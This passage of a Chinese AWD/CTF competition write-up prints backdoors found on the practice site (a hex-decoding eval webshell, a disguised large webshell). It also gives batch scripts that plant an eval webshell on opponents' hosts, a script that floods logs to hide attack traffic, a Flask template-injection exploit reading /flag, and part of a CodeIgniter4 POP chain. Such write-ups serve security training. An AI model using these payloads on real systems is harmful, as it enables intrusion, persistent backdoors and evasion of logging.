variable">$miao</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$setting</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$miao</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">miao</span> <span class="token operator">=</span> <span class="token variable">$miao</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">doSomethin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 以 | 拼接config ，即rxrsdl</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 在传入的setting后拼接rxrsdl移位1 ，即system</span>            <span class="token comment" spellcheck="true">// 也就是说传入的是参数，函数这里都写好了</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">setting</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">setting</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//$error($this->miao);</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$config</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Config</span><span class="token punctuation">(</span><span class="token variable">$setting</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">doSomethin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="批量化-6"><a href="#批量化-6" class="headerlink" title="批量化"></a>批量化</h6><p><img src="image-20211123140701277.png" alt="image-20211123140701277"></p><h5 id="awdhtml-App-Runtime-Logs-js-php"><a href="#awdhtml-App-Runtime-Logs-js-php" class="headerlink" title="awdhtml/App/Runtime/Logs/.js.php"></a>awdhtml/App/Runtime/Logs/.js.php</h5><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'password'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$password</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$hex</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$password</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hex</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// hexdec用于将16进制转10进制，chr将10进制ascii转字符，就是说将指令hex编码就行</span>        <span class="token variable">$string</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token variable">$hex</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$hex</span><span class="token punctuation">[</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//eval($string);</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个就有意思了，awd我用这个一直打学弟，学弟也一直用这个打我，当时我是把修的事给了同队学弟，大概因为是隐藏文件，他也没注意修，抓日志又抓不到直接访问的流量，导致我一直被学弟删站，我也伞兵了，我觉得我能用这个打学弟，学弟肯定把这洞修了，就一直没管，好嘛，最后修了一下，我们互相打的居然是一个洞，世界都安静了。</p><p>果然以后awd我找到洞就该直接给他修掉，磨磨唧唧半天都给学弟把我崩了</p><blockquote><p>写个小思路，当发现一个地方很像洞，又不会用时，可以挂上日志等着，总有强队会拿他来打你，这样就知道怎么用这个洞了</p></blockquote><p>这个洞批量利用思路也简单</p><h6 id="批量化-7"><a href="#批量化-7" class="headerlink" title="批量化"></a>批量化</h6><p><img src="image-20211123143028429.png" alt="image-20211123143028429"></p><p>将上面的批量脚本中传入的命令改为hex编码即可</p><h4 id="网站模板漏洞"><a href="#网站模板漏洞" class="headerlink" title="网站模板漏洞"></a>网站模板漏洞</h4><h5 id="awdhtml-Public-Home-default-404-html"><a href="#awdhtml-Public-Home-default-404-html" class="headerlink" title="awdhtml/Public/Home/default/404.html"></a>awdhtml/Public/Home/default/404.html</h5><p><img src="image-20211123143616480.png" alt="image-20211123143616480"></p><p><img src="image-20211123143451830.png" alt="image-20211123143451830"></p><p>这是一个学长准备的很有意思的漏洞，不过我当时手忙脚乱的，虽然发现了，但也只是匆匆注释了事，并没有去利用</p><p>首先这是一个html，无法直接去利用，好在他是个模板，404页面一般在出错时才会被使用，所以随便点一下，然后改错url</p><p><img src="image-20211123144707673.png" alt="image-20211123144707673"></p><p>得到flag</p><p>有趣的是404不止一个，靶场很多404页面都被写上了马，D盾还没扫出来，再加上通过404页面模板攻击很难让别人通过分析流量找到位置，所以很难找到并修复</p><h6 id="批量化-8"><a href="#批量化-8" class="headerlink" title="批量化"></a>批量化</h6><p><img src="image-20211123145220228.png" alt="image-20211123145220228"></p><h4 id="awdhtml-uploads-img1-20171124-gif-php"><a href="#awdhtml-uploads-img1-20171124-gif-php" class="headerlink" title="awdhtml/uploads/img1/20171124/gif.php"></a>awdhtml/uploads/img1/20171124/gif.php</h4><p>这个应该是D盾扫描后最难用的洞，因为gif.php实在太大，里面还有五个eval</p><p>当然我单独题出来不是因为eval,而是这地方漏洞太多，多到想怎么打就怎么打的地步</p><p>首先翻到最下面，发现只有Main类可以直接调用，其他类或许有问题，但不是轻易能调用成功的</p><p>我发现这个文件其实还真有的审</p><p><strong>ps: 审完了，是个伪装成正常文件的大马，我就不客气的收下了</strong></p><p><img src="image-20211123150959118.png" alt="image-20211123150959118"></p><p>在Main类的构造方法中获取了Get传参action</p><p><img src="image-20211123151138025.png" alt="image-20211123151138025"></p><p>调用进mainLogin后判断了cookie</p><p><img src="image-20211123152820162.png" alt="image-20211123152820162"></p><p><img src="image-20211123152927036.png" alt="image-20211123152927036"></p><p>不存在时整个链没啥用，存在就会以输入的action值进入对轮子的调用，当然这里可以拿到后台的密码</p><p><img src="image-20211123154254996.png" alt="image-20211123154254996"></p><p><img src="image-20211123152954170.png" alt="image-20211123152954170"></p><p><img src="image-20211123153028263.png" alt="image-20211123153028263"></p><p>action=delfile就是文件删除，将路径url编码后base64编码，get传入path即可删除任意文件</p><p><img src="image-20211123155047920.png" alt="image-20211123155047920"></p><p>action=deldir 删除目录，用法同上</p><p>不过鉴于这是个awd的靶场，虽然是大马，但还是需要写一下批量化</p><h6 id="批量化-9"><a href="#批量化-9" class="headerlink" title="批量化"></a>批量化</h6><p>和之前没什么区别，就是需要抓包拿一下数据，</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># TODO 获取flag ,漏洞利用函数 调用： flag = attack(url)</span><span class="token comment" spellcheck="true"># 此函数运行需要修改 payload_address data/posix并设置get/post传参</span><span class="token comment" spellcheck="true"># 此函数是以正常一句话马获取flag</span><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 木马文件路径,例如： include/shell.php 最开始不加 /</span>        payload_address <span class="token operator">=</span> <span class="token string">"uploads/img1/20171124/gif.php?action=wjdc&amp;path=L3Zhci93d3cvaHRtbC91cGxvYWRzL2ltZzEvMjAxNzExMjQv"</span>        <span class="token comment" spellcheck="true"># post</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"111"</span><span class="token punctuation">,</span>            <span class="token string">"newfile"</span><span class="token punctuation">:</span> <span class="token string">"L3Zhci93d3cvaHRtbC91cGxvYWRzL2ltZzEvMjAxNzExMjQvZmlsZS5waHA="</span><span class="token punctuation">,</span>            <span class="token string">"class"</span><span class="token punctuation">:</span> <span class="token string">"UTF-8"</span><span class="token punctuation">,</span>            <span class="token string">"charset"</span><span class="token punctuation">:</span> <span class="token string">"UTF-8"</span><span class="token punctuation">,</span>            <span class="token string">"txt"</span><span class="token punctuation">:</span> <span class="token string">"PD9waHAgCmlmKG1kNSgkX1BPU1RbJ3Bhc3N3ZCddKSA9PSAiZTQ1YzVlNDBlNmVkNmE4ZjljMWE0NzUwYzgxNTQ0NjAiKXsKICAgZXZhbCgkX1BPU1RbJ2NtZCddKTsKfQ=="</span><span class="token punctuation">,</span>            <span class="token string">"time"</span><span class="token punctuation">:</span> <span class="token string">"2021-11-23+22:15:24"</span><span class="token punctuation">,</span>            <span class="token string">"bin"</span><span class="token punctuation">:</span> <span class="token string">"wb+"</span><span class="token comment" spellcheck="true"># 攻击执行</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true"># get</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">""</span><span class="token punctuation">:</span> <span class="token string">""</span>  <span class="token comment" spellcheck="true"># get传参</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true"># porxy = {</span>        <span class="token comment" spellcheck="true">#     "http":"http://localhost:8080"</span>        <span class="token comment" spellcheck="true"># }</span>        header <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"PHPSESSIDS=5dce171e2fab0814d67170153804f937;"</span>        <span class="token punctuation">}</span>        url_shell <span class="token operator">=</span> url <span class="token operator">+</span> payload_address        shell_res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_shell<span class="token punctuation">,</span> data <span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text  <span class="token comment" spellcheck="true"># 这是post请求</span>        <span class="token comment" spellcheck="true"># shell_res = requests.get(url_shell, params=params).text  # 这是get请求</span>        flag_text <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'flag{.*?}'</span><span class="token punctuation">,</span> shell_res<span class="token punctuation">)</span>        flages <span class="token operator">=</span> str<span class="token punctuation">(</span>flag_text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"[+]"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flages<span class="token punctuation">)</span>        <span class="token keyword">return</span> flages    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag获取失败"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20211123222934414.png" alt="image-20211123222934414"></p><p>想再写马之后立即利用只需要再加一个提交attack函数即可</p><h3 id="脏日志"><a href="#脏日志" class="headerlink" title="脏日志"></a>脏日志</h3><p>为了恶心对手让他们不会狠轻易的抓到攻击流量，特意写了一个脏日志的脚本</p><p>还是之前写的函数，拼接修改一下就能用了</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># TODO 调用第三方库</span><span class="token keyword">import</span> base64<span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">import</span> random<span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token comment" spellcheck="true"># TODO 脏数据,用于恶心日志文件 调用：dirty_data(url)</span><span class="token comment" spellcheck="true"># 该函数已封装完毕，无需任何修改</span><span class="token comment" spellcheck="true"># 传入flag和题目靶机首地址，例如 http://172.17.135.26:10016/</span><span class="token keyword">def</span> <span class="token function">dirty_data</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">"system('cat /flag');"</span>        <span class="token punctuation">}</span>        s0 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        s1 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        s2 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        s3 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        s4 <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 生成脏链接</span>        url_dirty <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"?"</span> <span class="token operator">+</span> s0 <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> s1 <span class="token operator">+</span> s2 <span class="token operator">+</span> s3 <span class="token operator">+</span> s4        <span class="token comment" spellcheck="true"># print(url_dirty)</span>        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_dirty<span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"条脏数据上传失败"</span><span class="token punctuation">)</span>        <span class="token keyword">pass</span><span class="token comment" spellcheck="true"># 主函数</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 指定端口范围</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8001</span><span class="token punctuation">,</span> <span class="token number">8011</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment" spellcheck="true"># 跳过自己的靶机</span>                    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">8001</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    url <span class="token operator">=</span> <span class="token string">"http://172.17.135.39:{}/"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true">################# 函数调用区域 ################</span>                    dirty_data<span class="token punctuation">(</span>url<span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true">##############################################</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"主函数未知错误"</span><span class="token punctuation">)</span>            <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>EASYWEB1 EASYWEB2 靶场关了，不过这两道分别是入门难度的注入和文件上传，所以也不需要详细的写</p><p>web1 也关了，没撤，web1前四个点没什么意思，最后的udf提权和内网穿越还是很值得一提的，不过关了我也起不来，就这样吧</p><h3 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h3><p>题目源码</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">isLegalParam</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'\'|\"|_|{{.*}}|{%.*%}|\[|\]'</span><span class="token punctuation">,</span> param<span class="token punctuation">,</span> re<span class="token punctuation">.</span>M<span class="token operator">|</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span> <span class="token keyword">is</span> None<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/calc'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    formula <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span>    answer <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"answer"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> isLegalParam<span class="token punctuation">(</span>formula<span class="token punctuation">)</span> <span class="token operator">and</span> isLegalParam<span class="token punctuation">(</span>answer<span class="token punctuation">)</span><span class="token punctuation">:</span>        answerHtml <span class="token operator">=</span> formula <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> answer        <span class="token keyword">print</span><span class="token punctuation">(</span>answerHtml<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        answerHtml <span class="token operator">=</span> formula <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> answer        <span class="token keyword">print</span><span class="token punctuation">(</span>answerHtml<span class="token punctuation">)</span>        answerHtml <span class="token operator">=</span> <span class="token string">"Data illegality."</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>answerHtml<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/hint"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        file <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> file<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单分析一下逻辑：</p><p><img src="image-20211124124815208.png" alt="image-20211124124815208"></p><p>在calc路由下传入两个参数，calc和answer</p><p>然后程序输出clac = answer, 其中传参在上面经过了严格的过滤</p><p>首先闭合的花括号无法使用，但单独的花括号可以，这样就可以做到一个闭合</p><pre class="line-numbers language-python"><code class="language-python">?calc<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">1</span> <span class="token operator">*</span> <span class="token number">1</span> <span class="token operator">&amp;</span>answer<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样在拼接后就成了1+1==2 </p><p><img src="image-20211124125402455.png" alt="image-20211124125402455"></p><p>就达成了一个类似注入的效果</p><p>然后使用 <code>()|attr(request.args.x1) &amp;x1=__class__</code>的方式绕过正则限制执行命令，其中attr()方法设置或返回被选元素的属性和值。</p><p>意思是将()通过管道符传递给<code>__class__</code>执行</p><p>所以exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://10.160.108.106:5000/calc"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"calc"</span><span class="token punctuation">:</span> <span class="token string">"{{()|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3)()|attr(request.values.x4)(194)|attr(request.values.x5)|attr(request.values.x6)|attr(request.values.x4)(request.values.x7)|attr(request.values.x4)(request.values.x8)(request.values.x9)"</span><span class="token punctuation">,</span>            <span class="token string">"answer"</span><span class="token punctuation">:</span> <span class="token string">"=(request.values.x10)}}"</span><span class="token punctuation">,</span>            <span class="token string">"x1"</span><span class="token punctuation">:</span> <span class="token string">"__class__"</span><span class="token punctuation">,</span>            <span class="token string">"x2"</span><span class="token punctuation">:</span> <span class="token string">"__base__"</span><span class="token punctuation">,</span>            <span class="token string">"x3"</span><span class="token punctuation">:</span> <span class="token string">"__subclasses__"</span><span class="token punctuation">,</span>            <span class="token string">"x4"</span><span class="token punctuation">:</span> <span class="token string">"__getitem__"</span><span class="token punctuation">,</span>            <span class="token string">"x5"</span><span class="token punctuation">:</span> <span class="token string">"__init__"</span><span class="token punctuation">,</span>            <span class="token string">"x6"</span><span class="token punctuation">:</span> <span class="token string">"__globals__"</span><span class="token punctuation">,</span>            <span class="token string">"x7"</span><span class="token punctuation">:</span> <span class="token string">"__builtins__"</span><span class="token punctuation">,</span>            <span class="token string">"x8"</span><span class="token punctuation">:</span> <span class="token string">"eval"</span><span class="token punctuation">,</span>            <span class="token string">"x9"</span><span class="token punctuation">:</span> <span class="token string">"__import__('os').popen('cat /flag').read()[{}:{}]"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"x10"</span><span class="token punctuation">:</span> <span class="token string">"{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"True"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正式环境和自己起的靶场os的位置会有所不同，使用burp爆破，得到不会报500错误的既是os</p><h3 id="WEB3"><a href="#WEB3" class="headerlink" title="WEB3"></a>WEB3</h3><p>题目源码下载地址：链接：<a href="https://pan.baidu.com/s/1-XWbbb9x6YDvok25iaJ3Qw">https://pan.baidu.com/s/1-XWbbb9x6YDvok25iaJ3Qw</a>  提取码：GAME </p><p>pop链构造，CodeIgniter4框架，这里只放关键代码</p><p><img src="image-20211124164144913.png" alt="image-20211124164144913"></p><p><img src="image-20211124164325212.png" alt="image-20211124164325212"></p><p><img src="image-20211124164600465.png" alt="image-20211124164600465"></p><p><img src="image-20211124164849706.png" alt="image-20211124164849706"></p><p><img src="image-20211124164807562.png" alt="image-20211124164807562"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 执行终点</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Generator</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">formatters</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"delete"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 入口后继</span><span class="token keyword">namespace</span> <span class="token package">CodeIgniter<span class="token punctuation">\</span>Session<span class="token punctuation">\</span>Handlers</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">MemcachedHandler</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span 